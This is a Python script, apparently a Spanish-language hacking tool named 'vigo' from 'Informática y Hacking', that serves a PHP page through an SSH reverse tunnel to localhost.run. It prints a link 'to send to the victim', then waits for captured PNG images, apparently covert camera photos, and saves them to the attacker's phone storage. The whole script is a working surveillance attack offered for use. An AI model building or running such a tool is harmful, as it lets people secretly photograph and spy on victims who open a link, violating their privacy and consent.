#!/usr/bin/env python
# -*- coding: utf-8 -*-
import time
import sys
import glob
import subprocess as subp
import os.path
from colorama import init, Fore, Back, Style

init()
rj = Fore.RED
vr = Fore.GREEN
ci = Fore.CYAN
az = Fore.BLUE
am = Fore.YELLOW
r = Style.RESET_ALL

linux = os.path.exists('/usr/')
termux = os.path.exists('/data/data/com.termux/')
ptmx = os.path.exists('/storage/emulated/0/Capturadas')
captura = 'vigo/foto/captura'
sign = vr + '[' + r + '-' + vr + ']' + r
wrn = am + '[' + r + rj + '!'+ r + am + ']' + r

if termux == True:
	if ptmx == False:
		os.system('mkdir /storage/emulated/0/Capturadas')
		print (vr + 'Ejecutando en: ' + r + 'Termux')
		time.sleep(2)
	else:
		print (vr + 'Ejecutando en: ' + r + 'Termux')
		pass
elif linux == True:
	print (vr + 'Ejecutando en: ' + r + 'Kali Linux')
else:
	pass

def banner():
	os.system('clear')
	print (ci + '''					 ,,;;,,
			                :.cxxc.:
			                 :¨¨¨¨:
			                  c..c
			            xolcc:,..,:cclox
			        o:'.,odxOO0000OOxdo,.':o
			      l,cko.cXMMMWWWWWWMMMXc.okc,l
			     :'xXXx'.:olcc::::ccloc.'xXXx':
			 d:do.cOo,....................,oOc.od:o
			O'.:c.ok,..';;'................'dc.c:..x
			O'.:c.ok'.,dOOd,........,cll:..'oc.c:..x
			 l,ll.ok' 'lddc.........',.',..'oc.ll,c
			     .lk:. ....               .;d:.
			      ':lc:;'......  ......';:cl:'
			        '.,;::::::::::::::::;,.'
			        ,,..;:,,;,;;;,;;'';,..,
			       ,xk,,0KokK0OkkkOOdckx',O
			        OO;'kKldOOkxxxdxlcxd.;O
			         c'.c0xxXX0000OOolx;.'c
			           l,cxd0NNXXNNOll:,cl
			            O:;,cONWWNO:,,:O
			              Ol;;cclc;;lO
			                 0kkkk0 ''' + r)
	print (am + '''
			               d8,                  
			              `8P                   
			                                
			    ?88   d8P  88b d888b8b   d8888b 
			    d88  d8P'  88Pd8P' ?88  d8P' ?88
			    ?8b ,88'  d88 88b  ,88b 88b  d88
			    `?888P'  d88' `?88P'`88b`?8888P'
			                         )88        
			                        ,88P        
			                    `?8888P         
	''' + r)
	print (rj + '			 ________________________________________' + r)
	print ('			|_________ Informática y Hacking ________|')
	print (rj + '			|________________________________________|' + r)
	print ('			|_____https://informaticayhacking.com____|')
	print (rj + '			|________________________________________|' + r)
	print ('			|_______t.me/Informatica_y_Hacking_______|')
	print (rj + '			|________________________________________|\n\n' + r)

def proceso():
	marc = False
	print (sign + ci + ' Iniciando servidor...\n' + r)
	time.sleep(3)
	print ()
	with open('mphp.log', 'w') as mphp:
		subp.Popen(['php', '-S', 'localhost:4344', '-t', 'vigo/foto'], stderr=mphp, stdout=mphp)
	with open('mssh.log', 'w') as mssh:
		opr = subp.Popen(['ssh', '-R', '80:localhost:4344', 'ssh.localhost.run'], stdout = mssh)
	os.system('clear')
	time.sleep(3)
	with open('mssh.log', 'r') as mssh:
		salida = [linea.split() for linea in mssh]
		a = salida[0]
		b = ''.join(a)
		url = b[48:]
	os.system('reset')
	os.system('clear')
	banner()
	print (sign + vr + ' Enlace para enviar a la víctima: ' + r + url)
	mrc = False
	while True:
		time.sleep(2)
		tam = len(glob.glob('vigo/foto/captura/*.png'))
		if tam == 0 and mrc == False:
			print ('\n' + sign + ci + ' Esperando interacción de la víctima...' + r + '\n')
			print (sign + am + 'Si la interacción tarda demasiado,')
			print (sign + am + 'Presione ' + rj + 'Ctrl + C' + r + am + ' para salir.\n' + r)
			mrc = True
		if tam > 0:
			os.system('cp vigo/foto/captura/* /storage/emulated/0/Capturadas')
			os.system('clear')
			banner()
			print (sign + am + ' La captura ha sido obenida con éxito..!\n' + r)
			time.sleep(2)
			print (sign + ci + ' Se ha guardado en:' + r + ' /storage/emulated/0/Capturadas')
			os.system('rm vigo/foto/captura/*')
			time.sleep(10)
			os.system('reset')
			os.system('clear')
			banner()
			sys.exit()
	else:
		print (rj + 'error' + r)


try:
	banner()
	proceso()
	sys.exit()
except KeyboardInterrupt:
	banner()
	print (wrn + rj + ' Proceso intrrumpido por el usuario.' + r)
	os.system('pkill php')

#Creado por: System Failure - Informática y Hacking © 2020
